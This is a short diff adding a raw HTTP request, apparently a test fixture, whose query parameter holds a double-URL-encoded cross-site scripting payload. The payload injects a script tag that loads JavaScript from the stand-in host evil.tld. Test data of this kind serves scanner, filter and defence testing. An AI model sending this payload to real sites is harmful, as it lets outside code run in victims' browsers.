@@ -1,0 +1,4 @@
+GET /a?input=%253Cscript%2Bsrc%253D%252F%252Fevil.tld%252Fx.js%253E%253C%252Fscript%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
